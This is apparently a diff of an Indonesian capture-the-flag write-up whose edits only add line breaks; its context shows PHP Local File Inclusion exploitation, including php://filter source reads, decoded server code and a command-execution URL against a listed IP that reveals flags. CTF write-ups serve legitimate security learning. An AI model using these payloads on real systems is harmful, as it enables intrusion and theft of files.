@@ -42,13 +42,13 @@ didapatkan user dengan username **first-flag-is** dan password **KKST2021{do_you
 4. Saya lanjut mencari endpoint yang dapat di exploit lagi dan ditemukan bahwa parameter **editsecret** pada ***page.php?f=editsecret&id=your-id*** vuln terhadap **Local File Inclusion**
 5. Check error dengan mengganti **editsecret** dengan value lain yang invalid.
 **/page.php?f=randomstring**
-didapatkan error sebagai berikut :
+didapatkan error sebagai berikut :<br/><br/>
 ```
 **Warning**: include(randomstring.php): failed to open stream: No such file or directory in **/var/www/html/page.php** on line **15**  
   
 **Warning**: include(): Failed opening 'randomstring.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/page.php** on line **15**
 ```
-Dari error tersebut, saya mengira seperti inilah yang ada pada file page.php
+Dari error tersebut, saya mengira seperti inilah yang ada pada file page.php<br/>
 ```
 <?php
 	include($_GET["f"].".php");
@@ -57,11 +57,11 @@ Dari error tersebut, saya mengira seperti inilah yang ada pada file page.php
 ```
 6. Gunakan **php://filter/convert.base64-encode/resource=** untuk membaca file.<br/>
 ``http://103.171.85.90:8082/page.php?f=php://filter/convert.base64-encode/resource=page``
-didapatkan isi dari **page.php** dalam base64 encoding.
+didapatkan isi dari **page.php** dalam base64 encoding.<br/>
 ```
 PD9waHAgaW5jbHVkZSgnaGVhZGVyLnBocCcpOyA/PgoKCjw/cGhwCgogICAgaWYoaXNzZXQoJF9HRVRbJ2YnXSkpewoKCgogICAgICAgICRmaWxlcyA9ICRfR0VUWydmJ10uIi5waHAiOwoKICAgICAgICBpZihwcmVnX21hdGNoKCcvXC5wbmcvbScsICRfR0VUWydmJ10pKXsKICAgICAgICAgICAgaW5jbHVkZSAkX0dFVFsnZiddOwogICAgICAgIH1lbHNlewogICAgICAgICAgICBpbmNsdWRlICRmaWxlczsKICAgICAgICB9CgogICAgICAgIAoKICAgIH0KCj8+CgoKPD9waHAgaW5jbHVkZSgnZm9vdGVyLnBocCcpOyA/Pg==
 ```
-Setelah di decoding, didapatkan isi dari file **page.php**
+Setelah di decoding, didapatkan isi dari file **page.php**<br/><br/>
 ```<?php include('header.php'); ?>
 <?php
 
@@ -99,7 +99,7 @@ Setelah membaca file tersebut, ada sesuatu yang menarik yaitu, saya dapat memang
 11. Gunakan command **ls -lah** untuk melihat directory, sehingga ditemukan folder **.Administrator** yang berisikan file index.php
 12. Gunakan command **cat** untuk membaca file tersebut.
 ``http://103.171.85.90:8082/page.php?f=file/user.png&0=cat .Administrator/index.php``
-13. view-page source dan didapatkan flag bagian kedua :
+13. view-page source dan didapatkan flag bagian kedua :<br/>
 ```
 <?php 
   $another_flag = "now_another_cooking?_twiceeee!!!}";
